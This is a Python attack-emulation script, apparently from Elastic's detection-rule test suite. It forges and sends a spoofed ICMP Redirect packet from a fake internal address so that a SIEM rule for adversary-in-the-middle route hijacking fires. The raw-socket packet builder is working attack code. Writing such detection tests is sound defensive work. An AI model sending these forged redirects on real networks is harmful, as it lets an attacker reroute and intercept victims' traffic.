# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: ICMP Redirect Message from Internal Host
# RTA: icmp_redirect_message_from_internal_host.py
# Description: Crafts and emits a raw ICMP Redirect message (type 5) on the
#              wire with a spoofed internal RFC1918 source IP. This emulates a
#              workstation or server (rather than an on-path router) injecting a
#              route change, the hallmark of DoubleDirect-style ICMP redirect
#              adversary-in-the-middle activity, as captured by a network sensor
#              (Packetbeat network_traffic, Zeek, or PAN-OS) and indexed into
#              logs-network_traffic.icmp-*.
#
#              The source IP (10.10.10.10) is in 10.0.0.0/8, satisfying the
#              rule's RFC1918 source.ip condition. The Redirect payload carries
#              a spoofed gateway address plus the original datagram header that
#              a real redirect echoes back. ICMP type 5 (IPv4 Redirect) is used;
#              type 137 (ICMPv6 Redirect) would match the rule equally.
#
#              Requires CAP_NET_RAW (typically root). The local kernel may drop
#              egress packets with a foreign source IP depending on reverse-path
#              filtering; the network sensor only needs to observe the packet on
#              the wire to produce the flow event.

import logging
import os
import random
import socket
import struct

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

ICMP_REDIRECT_TYPE = 5     # type 137 (ICMPv6 Redirect) also matches the rule
ICMP_REDIRECT_CODE = 1     # 1 = redirect datagrams for the host
INTERNAL_SOURCE_IP = "10.10.10.10"      # RFC1918 source -> satisfies the rule
REDIRECTED_HOST_IP = "10.10.10.50"      # victim being told to change its route
SPOOFED_GATEWAY_IP = "10.10.10.66"      # attacker-controlled next hop
ORIGINAL_DEST_IP = "10.10.10.1"         # destination the victim was trying to reach


def _ones_complement_sum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s & 0xFFFF) + (s >> 16)
    s += s >> 16
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
    """Build a 20-byte IPv4 header with a correct checksum."""
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    total_len = 20 + payload_len
    ident = random.randint(0, 0xFFFF)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len, ident, 0, 64, proto, 0, src_bytes, dst_bytes,
    )
    checksum = _ones_complement_sum(header)
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len, ident, 0, 64, proto, checksum, src_bytes, dst_bytes,
    )


def _build_icmp_redirect(gateway_ip: str, original_datagram: bytes) -> bytes:
    """Build an ICMP Redirect message (type 5): gateway address + echoed datagram."""
    gateway_bytes = socket.inet_aton(gateway_ip)
    header = struct.pack("!BBH4s", ICMP_REDIRECT_TYPE, ICMP_REDIRECT_CODE, 0, gateway_bytes)
    checksum = _ones_complement_sum(header + original_datagram)
    header = struct.pack("!BBH4s", ICMP_REDIRECT_TYPE, ICMP_REDIRECT_CODE, checksum, gateway_bytes)
    return header + original_datagram


def _build_packet() -> bytes:
    """Wrap an ICMP Redirect in an IPv4 header sourced from the internal host."""
    # The original datagram a real redirect echoes: the victim's IP header that
    # triggered the redirect plus the first 8 bytes of its transport payload.
    original_ip = _build_ip_header(REDIRECTED_HOST_IP, ORIGINAL_DEST_IP, socket.IPPROTO_UDP, 8)
    original_first8 = struct.pack("!HHHH", random.randint(1024, 65535), 53, 8, 0)
    original_datagram = original_ip + original_first8

    icmp = _build_icmp_redirect(SPOOFED_GATEWAY_IP, original_datagram)
    ip_header = _build_ip_header(INTERNAL_SOURCE_IP, REDIRECTED_HOST_IP, socket.IPPROTO_ICMP, len(icmp))
    return ip_header + icmp


@register_code_rta(
    id="fb7ceeba-d3b0-4bca-b69d-a23f4312c311",
    name="icmp_redirect_message_from_internal_host",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="2014ebd8-b847-4cc0-a827-d0d61ec88680",
            name="ICMP Redirect Message from Internal Host",
        )
    ],
    techniques=["T1557"],
)
def main() -> None:
    """Emit a spoofed-source ICMP Redirect from an internal RFC1918 host."""
    if os.geteuid() != 0:
        log.error("Raw socket privileges required (run as root or with CAP_NET_RAW)")
        return

    packet = _build_packet()

    log.info(
        "Sending spoofed ICMP Redirect (type %d): %s -> %s, new gateway %s "
        "(internal-host redirect / AiTM emulation)",
        ICMP_REDIRECT_TYPE, INTERNAL_SOURCE_IP, REDIRECTED_HOST_IP, SPOOFED_GATEWAY_IP,
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        _ = sock.sendto(packet, (REDIRECTED_HOST_IP, 0))
        log.info("Spoofed ICMP Redirect emitted")
    except OSError as e:
        log.error("Failed to send spoofed ICMP packet: %s", e)
    finally:
        sock.close()
